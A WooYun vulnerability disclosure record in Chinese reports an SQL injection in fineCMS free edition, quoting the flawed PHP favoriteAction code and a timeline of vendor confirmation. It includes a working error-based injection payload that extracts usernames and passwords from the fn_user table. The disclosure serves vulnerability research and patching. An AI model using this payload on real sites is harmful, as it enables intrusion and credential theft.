{"id": 70810, "wybug_id": "wooyun-2015-0123899", "wybug_title": "fineCMS免费版注入再来一弹", "wybug_corp": "dayrui.com", "wybug_author": "yunxu", "wybug_date": "2015-07-01 17:46", "wybug_open_date": "2015-09-30 14:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-05：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-30：\t细节向公众公开  简要描述： 抢先呵呵!!! 详细说明：  问题文件：/controllers/member/InfoController.php\npublic function favoriteAction() {\t\t$favorite = $this->model('favorite');\t   if ($this->isPostForm()) {            $ids = '';            foreach ($this->post('ids') as $i) {                $ids.= ','.(int)$i;            }            $ids = trim($ids, ',');\t\t\tif (empty($ids)) {                $this->memberMsg(lang('m-inf-11'));            }\t\t\t$ids  = @implode(',', $this->post('ids'));\t\t\t$favorite->delete('userid=' . $this->memberinfo['id'].' and id IN(' . $ids . ')');\t   }\t    $page     = (int)$this->get('page');\t\t$page     = (!$page) ? 1 : $page;\t\t.......略......\n可以看到在第一次post获取ids值的时候全都转换成int了，但是狗血的是在后面又出现一个$ids  = @implode(',', $this->post('ids'));那么只要让这里的isPostForm函数确认是通过post提交的就可以注入了，因为这个功能是收藏夹选项，默认是get访问的再来看看isPostForm函数在父类文件：/controllers/Common.php\n/**     * 验证表单是否POST提交     */    public function isPostForm($var='submit', $emp=0) {        return Controller::isPostForm($var, $emp);}\n默认值是submit，开始构造在用户登录后-资料信息-我的收藏夹，点击进入后改用post提交\nsubmit=ok&ids[]=-1) and extractvalue(1,concat(0x7e,(select concat(username,0x7e,password) from fn_user limit 1))\n\n\n测试演示站点：\n\n   漏洞证明：  \n\n   修复方案：  改改改下   版权声明：转载请注明来源 yunxu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-07-02 14:34 厂商回复： 222 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}